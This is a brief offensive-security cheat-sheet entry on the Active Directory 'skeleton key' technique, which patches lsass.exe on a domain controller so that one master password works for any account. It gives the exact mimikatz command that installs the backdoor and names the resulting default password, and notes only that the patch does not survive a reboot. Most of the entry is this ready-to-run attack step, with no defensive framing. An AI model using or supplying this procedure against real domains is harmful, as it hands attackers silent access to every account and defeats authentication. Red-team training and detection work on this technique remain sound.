[Skeleton key](https://www.thehacker.recipes/a-d/persistence/skeleton-key) is a technique to bypass authentication by patching the `lsass.exe` process on the domain controller and hijacking the usual NTLM and Kerberos authentication flows.

What does this mean?
	A master password that works with ANY account.

We can use mimikatz to backdoor a skeleton.

> **NOT PERSISTENT AFTER REBOOT**

```powershell
# Create skeleton
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Usage?
<user> : mimikatz
```

